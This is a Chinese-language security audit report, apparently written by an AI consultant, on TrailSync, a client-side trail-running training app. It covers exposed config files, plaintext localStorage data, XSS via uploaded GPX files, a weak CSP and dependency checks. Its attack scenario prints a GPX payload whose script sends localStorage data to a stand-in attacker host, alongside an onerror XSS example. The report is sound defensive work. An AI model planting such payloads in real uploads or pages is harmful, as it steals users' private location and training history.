# TrailSync 資安審計報告 (Security Audit Report)

**報告日期:** 2025-09-07
**審計顧問:** Gemini Security Architect

---

### **專案基本資訊**

*   **專案名稱:** TrailSync
*   **專案簡介:** 一個為跑者與登山者設計的純前端訓練數據分析工具。提供 EPH（等效配速）計算、GAP（坡度調整配速）模型、訓練歷史紀錄、跑鞋里程追蹤與賽後復盤等功能。
*   **目標使用者:** 越野跑者、登山者、耐力運動愛好者。
*   **處理的資料類型:**
    *   **個人身份資訊 (PII):** 是。應用程式透過 `localStorage` 儲存使用者的訓練歷史、跑鞋資訊、賽後復盤日誌。這構成了 PII。
    *   **支付或財務資訊:** 否。
    *   **用戶上傳內容 (UGC):** 是。使用者可以上傳 GPX 格式的運動軌跡檔案。
*   **技術棧:**
    *   **前端:** Vanilla JavaScript (ESM), HTML, CSS
    *   **後端:** 無 (純客戶端應用)
    *   **資料庫:** 無 (使用瀏覽器 `localStorage` 進行資料持久化)
*   **部署環境:** 靜態網站託管 (如 Netlify, Vercel, GitHub Pages, 或傳統的 Apache/Nginx)。
*   **外部依賴:**
    *   **NPM 套件:** `jspdf`, `papaparse`
    *   **外部 CDN:** `html2canvas`

---

### **總體風險評估**

此專案為純前端應用，最大的風險來自於 **不安全的資料儲存**、**對用戶輸入的過度信任** 以及 **伺服器配置不當導致的資訊洩漏**。由於沒有後端，傳統的伺服器端漏洞（如 SQL Injection）不存在，但這也意味著任何需要保密的資訊（如 API 金鑰）都 **絕對不能** 儲存在前端程式碼中。

---

## **第一部分：災難性錯誤檢查 (Disaster-Class Mistakes)**

### **威脅 1：關鍵專案文件可被公開下載**

*   **風險等級:** `高`
*   **威脅描述:** 由於這是一個靜態網站，開發者很可能將整個專案目錄（包括 `package.json`, `rollup.config.js` 等）都部署到了網站根目錄。攻擊者可以直接透過 URL (`https://your-domain.com/package.json`) 下載此檔案，從而得知專案使用的所有依賴套件及其確切版本。
*   **受影響的元件:**
    *   `package.json`
    *   `rollup.config.js`
    *   `security-fixes.md` (本檔案)
    *   任何其他不應公開的原始碼或設定檔。

*   **駭客攻擊劇本 (Hacker's Playbook):**
    > 我是一個腳本小子 (Script Kiddie)。我看到你的網站很有趣，第一件事就是試著訪問 `https://your-domain.com/package.json`。成功了！我看到你正在使用 `papaparse` 的 `5.4.1` 版本和 `jspdf` 的 `3.0.2` 版本。我立刻打開 Google，搜尋 "papaparse 5.4.1 vulnerability" 或 "jspdf 3.0.2 CVE"。如果運氣好，我會找到一個已知的漏洞（例如，一個原型鍊污染或 XSS 漏洞）。現在，我不需要盲目地攻擊你的網站，我可以根據這個已知的弱點，製作一個特製的 GPX 檔案或輸入，精準地觸發漏洞來竊取你的用戶資料。

*   **修復原理 (Principle of the Fix):**
    > 你的網站伺服器就像一家餐廳。你應該只把「菜單」(`index.html`, `bundle.js`, `style.css`) 給顧客看，而不是把包含所有「食譜、供應商清單和廚房內部排班表」的管理手冊 (`package.json`, `rollup.config.js`) 也放在餐桌上。我們必須設定伺服器的「服務生」，告訴他哪些檔案是訪客可以拿的，哪些絕對不行。

*   **修復建議與程式碼範例:**
    1.  **只部署 `dist` 目錄：** 你的建置流程 (`rollup`) 會產生一個 `dist` 目錄（或類似名稱）。你的網站根目錄應該指向這個 `dist` 目錄，而不是整個專案的根目錄。這樣，原始碼和設定檔就自然不會被部署上去。
    2.  **設定伺服器規則：** 如果你必須在根目錄部署，請為你的 Web 伺服器（如 Nginx 或 Apache）添加規則，明確禁止訪問敏感檔案。

    **Nginx 設定範例 (`nginx.conf`):**
    ```nginx
    location ~* \.(json|md|js\.map|config\.js)$ {
        deny all;
    }
    ```

    **Apache 設定範例 (`.htaccess`):**
    ```apache
    <FilesMatch "\.(json|md|js\.map|config\.js)$">
        Order allow,deny
        Deny from all
    </FilesMatch>
    ```

---

### **威脅 2：敏感個人資訊 (PII) 以明文形式儲存於瀏覽器**

*   **風險等級:** `高`
*   **威脅描述:** 應用程式使用 `localStorage` 來儲存使用者的訓練歷史、跑鞋里程和賽後復盤。`localStorage` 中的資料是 **完全沒有加密** 的，並且可以被任何在同一個網域下運行的 JavaScript 程式碼讀取。如果網站存在任何 XSS (跨網站指令碼) 漏洞，攻擊者可以輕易地竊取所有使用者的個人訓練資料。
*   **受影響的元件:**
    *   `js/ui/history-manager.js`
    *   `js/ui/shoe-manager.js`
    *   `js/ui/debrief-manager.js`

*   **駭客攻擊劇本 (Hacker's Playbook):**
    > 我發現你的網站可以上傳 GPX 檔案。我精心製作了一個惡意的 GPX 檔案，它的 `<name>` 標籤裡包含了一段 JavaScript 程式碼：`<name><![CDATA[<script>fetch('https://my-evil-server.com/steal?data=' + localStorage.getItem('trailSyncTrainingHistory'))</script>]]></name>`。你上傳了這個檔案，你的應用程式在某處用 `innerHTML` 顯示了這個路線名稱。我的腳本被執行了！你毫無察覺，但你所有的訓練歷史（你去過哪裡、什麼時候去的、跑了多久）已經全部被發送到了我的伺服器。如果你的其他用戶也上傳或查看了這個惡意檔案，他們的資料也一樣會被我偷走。

*   **修復原理 (Principle of the Fix):**
    > 將資料儲存在 `localStorage` 就好比是把你的日記本放在一個公共圖書館的桌子上。雖然它在你的桌位（你的瀏覽器），但任何能溜進這個圖書館（觸發 XSS）的人都能翻閱你的日記。對於敏感的個人資料，最好的方法是將其存放在一個需要鑰匙（用戶認證）才能進入的私人保險櫃（後端加密資料庫）裡。

*   **修復建議與程式碼範例:**
    1.  **【根本解決方案】引入後端服務:** 對於處理 PII 的應用，最安全的做法是建立一個簡單的後端 API。
        *   使用者需要註冊帳號並登入。
        *   所有訓練資料都透過 API 發送到後端，並儲存在資料庫中（例如 PostgreSQL, MongoDB）。
        *   資料庫中的敏感欄位應加密儲存。
        *   前端只在用戶登入後，才從後端獲取屬於該用戶的資料。
    2.  **【短期緩解措施】告知使用者風險:** 如果你暫時無法建立後端，你 **必須** 在網站上明確告知使用者：「所有資料都只儲存在您的本機瀏覽器中，不會上傳到雲端。請注意，這意味著更換瀏覽器或清除快取將導致資料遺失，且在不安全的網路環境下存在資料洩漏風險。」
    3.  **避免使用 `localStorage` 進行敏感資訊儲存**，這是原則性問題。

---

## **第二部分：標準應用程式安全審計**

### **威脅 3：未經處理的用戶上傳內容可能導致 XSS**

*   **風險等級:** `中`
*   **威脅描述:** `gpx-parser.js` 使用 `DOMParser` 解析 XML，這能有效防禦 XXE 攻擊，是個好的實踐。然而，從 GPX 檔案中解析出的資料（如路線名稱、描述等）如果後續在 UI 中使用 `.innerHTML` 來顯示，就會造成 DOM-based XSS 漏洞。
*   **受影響的元件:**
    *   `js/core/gpx-parser.js` (資料來源)
    *   所有負責將解析後的資料渲染到畫面的 UI 模組。
*   **修復建議與程式碼範例:**
    *   **原則：** 永遠不要信任用戶輸入的內容。
    *   **實踐：** 在將任何來自用戶的資料插入到 DOM 時，優先使用 `.textContent` 而不是 `.innerHTML`。`.textContent` 會將所有內容視為純文字，瀏覽器不會解析其中的 HTML 標籤。

    **修正前 (危險):**
    ```javascript
    // 假設 gpxData.name = "<img src=x onerror=alert('XSS')>"
    const titleElement = document.getElementById('route-title');
    titleElement.innerHTML = gpxData.name; // 這會執行惡意腳本
    ```

    **修正後 (安全):**
    ```javascript
    const titleElement = document.getElementById('route-title');
    titleElement.textContent = gpxData.name; // 這只會顯示純文字
    ```
    *   如果必須渲染富文本，請使用成熟的 HTML 清理庫，如 `DOMPurify`。

### **威脅 4：不安全的內容安全策略 (CSP)**

*   **風險等級:** `中`
*   **威脅描述:** 在 `index.html` 中，CSP 規則包含了 `'unsafe-eval'`。這個指令允許頁面使用 `eval()` 和類似的字串轉程式碼的函數。這會大大增加攻擊面，使得某些 XSS 攻擊更容易成功。許多現代函式庫已不再需要此設定。
*   **受影響的元件:** `index.html` 的 `<meta>` 標籤。
*   **修復建議:**
    1.  從 `script-src` 指令中移除 `'unsafe-eval'`。
    2.  檢查你的程式碼或依賴的函式庫（例如 `html2canvas` 或其他圖表庫）是否真的需要它。
    3.  如果需要，尋找不依賴 `eval()` 的替代方案或更新版本。

    **修正後 (更安全):**
    ```html
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' https://cdnjs.cloudflare.com;">
    ```

### **威脅 5：依賴與供應鏈安全**

*   **風險等級:** `待確認`
*   **威脅描述:** `package.json` 中列出的 `jspdf` 和 `papaparse` 套件可能存在已知的公開漏洞 (CVEs)。攻擊者可以利用這些漏洞來攻擊你的應用程式。
*   **受影響的元件:** `package.json`
*   **修復建議:**
    *   定期使用 `npm audit` 來掃描你的專案，找出有漏洞的依賴。
    *   執行 `npm audit fix` 來自動修復它們。
    *   對於無法自動修-復的漏洞，需要手動評估風險並考慮升級套件主版本或更換替代品。

---

## **第三部分：後續步驟與授權請求**

我已經指出了幾個最關鍵的風險。然而，程式碼庫中可能還存在其他類似的問題。

**請求授權以進行自動化掃描：**
我發現了幾個潛在的風險模式（例如，使用 `innerHTML`、操作 `localStorage`）。為了確保找出所有類似問題，**您是否同意我為您執行 `npm audit` 命令，來快速掃描整個專案的依賴關係，找出已知的漏洞？這個命令只會進行讀取和分析，不會修改任何檔案。**

請回覆我是否繼續執行 `npm audit`。
